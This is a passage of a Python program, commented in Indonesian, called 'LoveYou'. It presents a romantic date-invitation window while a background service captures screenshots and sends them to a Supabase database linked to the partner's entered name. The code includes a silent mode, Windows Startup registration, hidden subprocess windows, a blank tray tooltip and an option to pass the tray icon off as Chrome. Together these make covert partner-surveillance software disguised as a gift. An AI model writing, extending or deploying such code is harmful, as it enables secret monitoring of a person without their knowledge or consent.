        self.is_running = False
        icon.stop()

    def on_emergency_uninstall(self, icon=None, item=None):
        """Callback menu System Tray untuk menonaktifkan dan menghapus aplikasi sampai bersih."""
        uninstall_and_clean_exit(self)


def setup_tray(controller: ServiceController) -> pystray.Icon:
    """Membangun menu interaktif untuk system tray native Windows."""
    tray_icon_file = controller.conf.get("tray_icon", "heart.ico")
    is_chrome = "chrome" in tray_icon_file.lower() or "chrome" in controller.conf.get("app_name", "").lower()
    icon_image = get_tray_icon_image(tray_icon_file)

    def get_pause_label(item):
        return "▶ Lanjutkan Screenshot" if controller.is_paused else "⏸ Jeda Screenshot"

    app_name = controller.conf.get("app_name", "LoveYou")
    header_label = f"🌐 {app_name}" if is_chrome else "❤️ LoveYou"
    app_open_label = f"🌐 Buka {app_name}" if is_chrome else "💕 Buka LoveYou App"

    menu_items = [
        pystray.MenuItem(header_label, None, enabled=False),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem(app_open_label, controller.on_open_love_ui, default=True),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem("📸 Ambil Screenshot Sekarang", controller.on_capture_now),
        pystray.MenuItem("🖼️ Buka Galeri Hasil SS", controller.on_open_gallery),
        pystray.MenuItem("🌐 Buka Dashboard Supabase", controller.on_open_supabase),
    ]

    # Hanya tampilkan menu buka folder lokal jika mode simpan lokal aktif
    if controller.conf.get("keep_local_file", True):
        menu_items.append(pystray.MenuItem("📂 Buka Folder Screenshot Lokal", controller.on_open_local_folder))

    menu_items.extend([
        pystray.Menu.SEPARATOR,
        pystray.MenuItem(get_pause_label, controller.on_toggle_pause),
        pystray.MenuItem("⚙️ Buka Konfigurasi (config.ini)", controller.on_open_config),
        pystray.Menu.SEPARATOR,
        pystray.MenuItem("🛑 Nonaktifkan & Hapus (Uninstall)", controller.on_emergency_uninstall),
        pystray.MenuItem("❌ Keluar", controller.on_exit),
    ])

    menu = pystray.Menu(*menu_items)

    tray = pystray.Icon(
        name=app_name if is_chrome else "LoveYou",
        icon=icon_image,
        title=" ",  # Dikosongkan agar tidak memunculkan tooltip apapun saat kursor diarahkan ke ikon
        menu=menu,
    )
    controller.tray_icon = tray
    return tray


class LoveYouApi:
    """Bridge Python-JS untuk pywebview agar frontend bisa memanggil fungsi Python."""
    def __init__(self, controller=None):
        self.controller = controller
        self._last_submit = None

    def set_user(self, nama: str):
        """Dipanggil dari name.html saat user memasukkan nama."""
        nama = (nama or "").strip()
        print(f"[UI BRIDGE] set_user diterima: '{nama}'")
        if self.controller:
            self.controller.set_active_user(nama)

    def submit_response(self, nama: str, tanggal: str, status: str):
        """Menerima kiriman respons ajakan date dari JavaScript frontend."""
        nama = (nama or "").strip()

        # Deduplikasi: cegah insert ganda jika fungsi terpanggil berkali-kali dalam 10 detik
        now = time.time()
        if self._last_submit and (now - self._last_submit.get("time", 0) < 10):
            if self._last_submit.get("nama") == nama and self._last_submit.get("status") == status:
                print(f"[UI BRIDGE] Mengabaikan submit duplikat untuk: {nama} ({status})")
                return

        self._last_submit = {"nama": nama, "status": status, "time": now}
        print(f"[UI BRIDGE] Respons pacar: {nama} | Tanggal: {tanggal} | Status: {status}")

        if self.controller:
            # Set user aktif agar screenshot berikutnya diasosiasikan dengan user ini
            self.controller.set_active_user(nama)

            if self.controller.supabase_logger:
                try:
                    rec = {
                        "nama": nama,
                        "tanggal_date": tanggal,
                        "status": status,
                        "created_at": datetime.now(timezone.utc).isoformat(),
                    }
                    self.controller.supabase_logger.client.table("user_responses").insert(rec).execute()
                    print(f"[UI BRIDGE] Berhasil simpan ke user_responses Supabase: {rec}")
                except Exception as e:
                    print(f"[UI BRIDGE ERROR] Gagal simpan ke Supabase: {e}")


_mutex_handle = None

def is_app_already_running() -> bool:
    """Mengecek apakah instance LoveYou sudah aktif di latar belakang (Windows Mutex)."""
    global _mutex_handle
    try:
        ERROR_ALREADY_EXISTS = 183
        kernel32 = ctypes.windll.kernel32
        _mutex_handle = kernel32.CreateMutexW(None, False, "Global\\LoveYouNativeAppMutex")
        if kernel32.GetLastError() == ERROR_ALREADY_EXISTS:
            return True
    except Exception:
        pass
    return False


def _launch_ui_subprocess():
    """Spawn loveyou.exe --ui di proses baru agar pywebview berjalan di main thread proses tsb."""
    if getattr(sys, "frozen", False):
        cmd = [sys.executable, "--ui"]
    else:
        cmd = [sys.executable, os.path.abspath(__file__), "--ui"]
    try:
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"[UI ERROR] Gagal spawn subprocess UI: {e}")


def run_ui_window(controller=None):
    """
    Menampilkan jendela native LoveYou App (pywebview Edge Chromium).
    Blok thread pemanggil sampai jendela ditutup.
    """
    index_path = get_frontend_path()
    if not os.path.exists(index_path):
        print(f"[UI ERROR] File frontend tidak ditemukan di: {index_path}")
        return

    url = "file:///" + index_path.replace("\\", "/")
    print(f"[UI] Membuka jendela LoveYou: {url}")

    api = LoveYouApi(controller=controller)
    webview.create_window(
        title="❤️ LoveYou",
        url=url,
        js_api=api,
        width=560,
        height=760,
        resizable=True,
        min_size=(420, 580),
        background_color="#0d0007",
    )
    webview.start(gui="edgechromium")


def main():
    parser = argparse.ArgumentParser(description="LoveYou Native Screenshot Service & Romantic UI")
    parser.add_argument("--ui", action="store_true", help="Hanya tampilkan jendela LoveYou App (webview)")
    parser.add_argument("--silent", action="store_true", help="Jalankan di latar belakang tanpa pop-up UI")
    parser.add_argument("--background", action="store_true", help="Alias untuk --silent")
    parser.add_argument("--test", action="store_true", help="Jalankan 1 kali screenshot pengujian lalu keluar")
    parser.add_argument("--no-startup", action="store_true", help="Jangan daftarkan ke Windows Startup")
    parser.add_argument("--no-tray", action="store_true", help="Jalankan tanpa icon System Tray (Headless)")
    parser.add_argument("--interval", type=int, default=None, help="Override interval screenshot dalam detik")
    args = parser.parse_args()

    # 1. Mode --ui: hanya tampilkan jendela LoveYou App
    if args.ui:
        conf = load_config()
        controller = ServiceController(conf)
        run_ui_window(controller)
        return

    # 2. Cek apakah service sudah aktif di latar belakang (Single Instance)
    if is_app_already_running():
        if args.silent or args.background:
            return
        # Jika user mengklik loveyou.exe saat service sudah jalan, langsung buka UI!
        print("[INFO] LoveYou Service sudah aktif di latar belakang. Membuka jendela UI...")
        conf = load_config()
        controller = ServiceController(conf)
        run_ui_window(controller)
        return

    # 3. Main Instance: Inisialisasi Service
    conf = load_config()
    if args.interval is not None and args.interval > 0:
        conf["interval_seconds"] = args.interval

    print("=" * 65)
    print("   LOVEYOU SCREENSHOT SERVICE & ROMANTIC UI")
    print("=" * 65)
    print(f" URL Supabase     : {conf['supabase_url']}")
    print(f" Tabel Database   : {conf['table_name']}")
    print(f" Storage Bucket   : {conf['bucket_name']}")
    print(f" Interval Detik   : {conf['interval_seconds']} detik")
    print(f" Format Gambar    : {conf['image_format'].upper()} (Quality: {conf['jpg_quality']}%)")
    print(f" Folder Lokal     : {conf['local_folder']}")
    print(f" Nama Registry    : {conf['app_name']}")
    print("=" * 65)

    controller = ServiceController(conf)

    # Daftarkan ke Windows Startup jika aktif di config
    if conf["auto_start"] and not args.no_startup and not args.test:
        if register_startup(conf["app_name"]):
            print(f"[OK] Terdaftar di Windows Startup (Registry & Shell:Startup): {conf['app_name']}")

    # Mode Test 1x
    if args.test:
        print("\n[INFO] Menjalankan mode pengujian 1 kali capture...")
        controller.on_capture_now(None, None)
        uploader_thread = threading.Thread(target=controller.uploader_worker, daemon=True)
        uploader_thread.start()
        time.sleep(3)
        controller.is_running = False
        print("[INFO] Pengujian selesai.")
        return

    # Jalankan background capture & uploader threads
    capture_thread = threading.Thread(target=controller.capture_worker, daemon=True)
    uploader_thread = threading.Thread(target=controller.uploader_worker, daemon=True)
    capture_thread.start()
    uploader_thread.start()

    # Jalankan pintasan darurat (emergency hotkey) jika aktif di konfigurasi
    if conf.get("emergency_hotkey", True) and not args.test:
        start_emergency_hotkey_listener(controller)

    # Jalankan System Tray (detached)
    tray = None
    if not args.no_tray:
        tray = setup_tray(controller)
        try:
            tray.run_detached()
            print("\n[INFO] Ikon LoveYou telah aktif di System Tray (Pojok kanan bawah).")
        except Exception as e:
            print(f"[WARN] Tray run_detached gagal: {e}")

    print("[INFO] Layanan screenshot aktif di latar belakang setiap 3 detik.")

    # 4. Jika bukan mode silent, langsung tampilkan jendela UI LoveYou di layar!
    if not (args.silent or args.background):
        print("[INFO] Membuka jendela LoveYou App di layar...")
        try:
            run_ui_window(controller)
        except Exception as e:
            print(f"[WARN] Jendela UI ditutup atau error: {e}")

    # 5. Jaga proses tetap berjalan di latar belakang (screenshot terus berjalan)
    try:
        while controller.is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        controller.is_running = False

    if tray:
        try:
            tray.stop()
        except Exception:
            pass

    print("\n[INFO] Layanan LoveYou selesai.")


if __name__ == "__main__":
    main()
